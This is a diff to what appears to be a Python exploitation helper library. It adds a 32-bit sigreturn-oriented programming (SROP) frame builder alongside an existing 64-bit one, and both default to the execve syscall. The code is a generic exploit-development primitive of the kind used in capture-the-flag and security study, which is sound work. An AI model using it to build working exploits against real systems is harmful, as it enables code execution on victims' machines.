@@ -56,6 +56,12 @@ def fmtchar(prev_word,word,index,byte = 1):
     return fmt
 
 #srop x86_64
+#sigret
+#    mov rax,0xf
+#    syscall
+#rip
+#    syscall
+
 def srop(sigret,rip,rbp,rsp,rdi = 0,rsi = 0,rax = 0x3b ,rbx = 0,rcx = 0,rdx = 0):
     uc_flags,uc_link,ss_sp,ss_flags,ss_size = [0,0,0,0,0]
     r8,r9,r10,r11,r12,r13,r14,r15 = [0,0,0,0,0,0,0,0]
@@ -94,4 +100,44 @@ def srop(sigret,rip,rbp,rsp,rdi = 0,rsi = 0,rax = 0x3b ,rbx = 0,rcx = 0,rdx = 0)
     ucontext += pack(oldmask)
     ucontext += pack(cr2)
     return ucontext
-    
+   
+#srop 32
+#sigret 
+#    mov eax,0x77
+#    int 0x80
+# eip
+#    int 0x80
+
+def srop32(sigret,eip,ebp,esp,ebx = 0,ecx = 0,edx = 0,eax = 0xb,edi = 0,esi = 0):
+    gs = 0x33
+    cs = 0x73
+    ss = 0x7b
+    ds = 0x7b
+    es = 0x7b
+    fs = 0x0
+    trapno,err,eflags,sigesp,fpstate,oldmask,cr2 = [1,0,286,esp,0,0,0]
+    sigcontext = ""
+    sigcontext += pack32(sigret)
+    sigcontext += pack32(gs)
+    sigcontext += pack32(fs)
+    sigcontext += pack32(es)
+    sigcontext += pack32(ds)
+    sigcontext += pack32(edi)
+    sigcontext += pack32(esi)
+    sigcontext += pack32(ebp)
+    sigcontext += pack32(esp)
+    sigcontext += pack32(ebx)
+    sigcontext += pack32(edx)
+    sigcontext += pack32(ecx)
+    sigcontext += pack32(eax)
+    sigcontext += pack32(trapno)
+    sigcontext += pack32(err)
+    sigcontext += pack32(eip)
+    sigcontext += pack32(cs)
+    sigcontext += pack32(eflags)
+    sigcontext += pack32(sigesp)
+    sigcontext += pack32(ss)
+    sigcontext += pack32(fpstate)
+    sigcontext += pack32(oldmask)
+    sigcontext += pack32(cr2)
+    return sigcontext
